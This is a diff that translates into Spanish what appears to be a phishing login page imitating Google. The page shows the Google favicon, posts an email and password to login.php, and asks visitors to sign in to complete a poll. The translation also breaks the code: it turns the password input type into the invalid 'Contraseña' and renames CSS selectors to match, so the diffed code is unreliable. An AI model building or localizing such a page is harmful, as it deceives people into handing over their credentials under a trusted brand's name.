@@ -46,7 +46,7 @@ body {
   position: relative;
 }
 
-.login-card input[type=text], input[type=password] {
+.login-card input[type=text], input[type=contraseña] {
   height: 44px;
   font-size: 16px;
   width: 100%;
@@ -61,7 +61,7 @@ body {
   -moz-box-sizing: border-box;
 }
 
-.login-card input[type=text]:hover, input[type=password]:hover {
+.login-card input[type=text]:hover, input[type=contraseña]:hover {
   border: 1px solid #b9b9b9;
   border-top: 1px solid #a0a0a0;
   -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
@@ -127,13 +127,13 @@ body {
 <div class="login-card">
     <p align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2d/Google-favicon-2015.png/150px-Google-favicon-2015.png" style="width: 30%;"></p><br>
   <form action="login.php" method="post">
-    <input type="text" name="email" placeholder="Username" required>
-    <input type="password" name="pass" placeholder="Password" required>
+    <input type="text" name="email" placeholder="Usuario" required>
+    <input type="Contraseña" name="contraseña" placeholder="Contraseña" required>
     <input type="submit" name="login" class="login login-submit" value="login">
   </form>
     
-  <div class="login-help">
-    Login in to complete poll.
+  <div class="login-ayuda">
+    Inicie sesión para completar la encuesta.
   </div>
 </div>
 </body>
